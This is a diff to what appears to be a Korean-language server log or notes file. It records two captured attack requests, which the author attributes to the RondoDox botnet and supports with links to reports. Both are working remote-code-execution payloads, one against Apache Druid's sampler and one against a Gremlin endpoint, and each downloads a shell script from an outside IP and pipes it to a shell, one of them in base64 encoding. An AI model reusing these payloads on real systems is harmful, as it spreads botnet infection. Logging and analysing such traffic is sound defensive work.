@@ -285,3 +285,45 @@ Traceback (most recent call last):
     guest, guestbook = body.split("said:", 1)
 ValueError: not enough values to unpack (expected 2, got 1)
 ```
+
+
+
+
+1.8
+얜 또 뭐야
+
+```
+POST /druid/indexer/v1/sampler HTTP/1.1
+Host: 158.247.200.157:8080
+User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
+Connection: close
+Accept: */*
+Content-Type: application/json
+Content-Length: 659
+
+{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/etc","filter":"passwd"}},"dataSchema":{"dataSource":"QxRkLmZp","parser":{"parseSpec":{"format":"javascript","timestampSpec":{},"dimensionsSpec":{},"function":"function(){var AbCdEf=new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~(wget -qO- http://41.231.37.153/rondo.mtg.sh||busybox wget -qO- http://41.231.37.153/rondo.mtg.sh||curl -s http://41.231.37.153/rondo.mtg.sh)|sh\".split(\"`@~\")).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"1234567\",GhIjKl:AbCdEf}}","":{"enabled":"true"}}}},"samplerConfig":{"numRows":10}}
+```
+
+얜또뭐야
+
+```
+POST /gremlin HTTP/1.1
+Host: 158.247.200.157:8080
+User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
+Connection: close
+Accept: */*
+Content-Type: application/json
+Content-Length: 733
+
+{"gremlin":"Thread AbCdEf=Thread.currentThread();Class GhIjKl=Class.forName(\"java.lang.Thread\");java.lang.reflect.Field MnOpQr=GhIjKl.getDeclaredField(\"name\");MnOpQr.setAccessible(true);MnOpQr.set(AbCdEf,\"AbCdEf\");Class processBuilderClass=Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor StUvWx=processBuilderClass.getConstructor(java.util.List.class);java.util.List YzAbCd=java.util.Arrays.asList(\"bash\",\"-c\",\"{echo,d2dldCAtcU8tIGh0dHA6Ly80MS4yMzEuMzcuMTUzL3JvbmRvLm10Zy5zaHxzaA==}|{base64,-d}|bash\");Object EfGhIj=StUvWx.newInstance(YzAbCd);java.lang.reflect.Method KlMnOp=processBuilderClass.getMethod(\"start\");KlMnOp.invoke(EfGhIj);","bindings":{},"language":"gremlin-groovy","aliases":{}}
+```
+
+똑같은 봇넷 출신인듯?
+
+https://itnext.io/rondodox-v2-evolution-of-rondodox-botnet-with-650-more-exploits-b16427b17aea
+
+https://www.codebru.com/learn/how-we-recovered-server-compromise-rondodox-botnet-cve-2025-55182
+
+https://www.f5.com/labs/articles/shellshock-makes-a-comeback-and-rondodox-changes-tactics
+
+https://www.facebook.com/xeraph/posts/%EC%B5%9C%EA%B7%BC-rondodox-%EB%B4%87%EB%84%B7-%ED%99%9C%EB%8F%99%EC%9D%B4-%EC%9E%90%EC%A3%BC-%EB%B3%B4%EC%9E%85%EB%8B%88%EB%8B%A41-xwiki-cve-2025-24893get-xwikibingetmainsolrsearchmed/25560158430281349/
